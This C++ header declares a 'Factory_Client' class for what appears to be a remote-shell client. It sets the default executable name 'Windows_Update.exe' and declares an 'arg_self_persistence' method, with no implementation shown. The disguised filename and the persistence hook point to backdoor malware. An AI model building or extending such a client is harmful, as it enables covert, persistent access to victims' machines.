#pragma once
#include "Client.h"
#include "Shell.h"
#include "Scripts_c.h"
#define BUFFER_LEN 256
#define DEFAULT_NAME "Windows_Update.exe"

class Client;

class Factory_Client
{
private:
	std::vector<std::string> args;
	const std::string buffer;
	Client* client = NULL;
public:
	Factory_Client(Client* client, const char* pbuffer);
	void arg_self_persistence();

};

